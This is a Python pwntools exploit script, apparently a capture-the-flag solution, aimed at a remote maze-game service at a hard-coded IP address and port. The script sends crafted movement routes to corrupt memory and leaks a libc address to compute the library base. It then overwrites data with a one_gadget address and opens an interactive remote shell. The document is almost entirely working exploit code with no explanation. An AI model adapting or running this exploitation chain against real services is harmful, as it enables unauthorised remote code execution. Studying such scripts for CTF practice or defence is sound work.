from pwn import *

context(log_level = 'debug')

r = remote("202.198.27.90", 40140)
#r = process('./pwn')

lg = lambda s: log.info('\033[1;32;40m%s --> 0x%x\033[0m' % (s, eval(s)))

first_debug = 1
debugging = 1
pausing = 1
def debug(*args):
    global first_debug
    if not debugging: return
    if first_debug:
        gdb.attach(r, *args)
        first_debug = 0
    if pausing: pause()

def parse_u64(raw):
    assert len(raw) <= 8
    return u64(raw.ljust(8, b'\0'))

def parse_int(raw):
    tokens = b'box0123456789abcdef'
    ret = ''
    for i in raw:
        if i not in tokens:
            return int(ret, 0)
        else:
            ret += chr(i)
    return int(ret, 0)

def wait():
    time.sleep(0.01)

route0 = 'wdddwwdddsssddssdddwwwwdddddddssddddddddddddddddddddddddddddddddddddddddddddddddddddddddddwwwwwwwwwwwwwwwwwwwwwwwwwwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasasaaawaaasaaaaaaawwwwddddwdddsdddwwddddwwwdddwddddssddwddddsssdddwwwwwwwwwwddddddddddwwwwwwwwddddddddddddddddssssssssdddddddddddwwwwwwddddddddddssssssddddddddwwwwwwwddddddddssssssdddwwwwwwwwddddddddddddddwwaaaaaaaaaaaaaaaaaaaaaaawwaawwwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawddddddddddddddddddddddddddddddddddddddddddddddddddawdddsddddddddddddddddddddddddddddddddddddsdddwd'
route1 = 'd'
route2 = 'w' + 'd'*2 + 's'*30 + 'd'*(0x68-66-1)
route3 = 'w' + 'd'*2 + 'w'*30 + 'd'*(0x68-66-1)

r.sendlineafter(b'>>> ', b'r')
r.sendafter(b'name: ', b'a')
r.sendlineafter(b'>>> ', b'')

r.sendlineafter(b'>>> ', (route0 + route1).encode())
r.sendafter(b'name: ', b'a')
r.sendlineafter(b'>>> ', b'')

r.sendlineafter(b'>>> ', (route0 + route2).encode())
r.sendlineafter(b'>>> ', b'r')
r.sendafter(b'name: ', b'a')
r.recvuntil(b'Challenger `')
libc_base = u64(r.recv(17)[-8:]) - 0x3966b8
one_gadget = libc_base + 0x3ef87
r.sendlineafter(b'>>> ', b'')

r.sendlineafter(b'>>> ', (route0 + route3).encode())
r.sendlineafter(b'>>> ', b'r')
lg('libc_base')
r.sendafter(b'name: ', b'a' + p64(0) + p64(one_gadget))

r.interactive()
r.close()
